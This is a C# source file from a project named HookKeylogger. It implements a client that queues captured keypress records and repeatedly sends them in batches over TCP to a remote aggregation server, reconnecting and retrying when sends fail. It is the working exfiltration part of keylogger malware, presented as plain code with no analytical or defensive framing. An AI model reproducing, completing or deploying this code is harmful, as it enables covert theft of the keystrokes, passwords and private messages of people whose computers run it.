using Google.Protobuf;
using HookKeylogger.AggergationServer.Types;
using HookKeylogger.Base;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace KeypressAggregator
{
    public static class TCPExtension
    {
        /// <summary>
        /// Get the TcpState of the connection.
        /// http://goo.gl/NTEPqn
        /// </summary>
        /// <param name="tcpClient"></param>
        /// <returns></returns>
        public static TcpState GetState(this TcpClient tcpClient)
        {
            var foo = IPGlobalProperties.GetIPGlobalProperties()
              .GetActiveTcpConnections()
              .SingleOrDefault(x => x.LocalEndPoint.Equals(tcpClient.Client.LocalEndPoint));
            return foo != null ? foo.State : TcpState.Unknown;
        }
    }
    

    class ServerClient
    {
        private ConcurrentQueue<CI> inq ;
        private ConcurrentQueue<CI> buffer;
        private string addr;
        private int port;
        private int bufSize;
        private TcpClient client;

        public ServerClient(string addr, int port)
        {
            this.inq = new ConcurrentQueue<CI>();
            this.buffer = new ConcurrentQueue<CI>();
            this.addr = addr;
            this.port = port;
            this.bufSize = 10;
            this.client = new TcpClient(addr, port);
        }

        /// <summary>
        /// Worker routine which reads from the input queue and sends the messages to the server.
        /// </summary>
        public void Start()
        {
            while (this.inq != null)
            {
                CI ci;
                while (inq.TryDequeue(out ci))
                {
                    buffer.Enqueue(ci);
                    
                    // If the buffer is full, write to the server.
                    if (buffer.Count >= bufSize)
                    {
                        this.send();
                    }
                }
                Thread.Sleep(1000);
            }
        }

        /// <summary>
        /// If the client is not connected try and connect again.
        /// </summary>
        private bool connect()
        {
            if (client.GetState() != TcpState.Established)
            {
                client.Connect(this.addr, this.port);
            }
            if (client.GetState() != TcpState.Established)
            {
                return false;
            }
            else
            {
                return true;
            }
        }

        /// <summary>
        /// Send the buffer to the server.
        /// </summary>
        private void send()
        {
            if (!connect())
            {
                return;
            }

            BufferedStream stream = new BufferedStream(client.GetStream());
            CI ci;
            while(buffer.TryDequeue(out ci))
            {
                try {
                    ci.WriteDelimitedTo(stream);
                }
                catch (SocketException)
                {
                    // Assume the message was not received, place the message back in the send buffer.
                    buffer.Enqueue(ci);
                    break;
                }

            }
            stream.Flush();
        }

        public void Send(CI ci)
        {
            this.inq.Enqueue(ci);
        }
    }
}
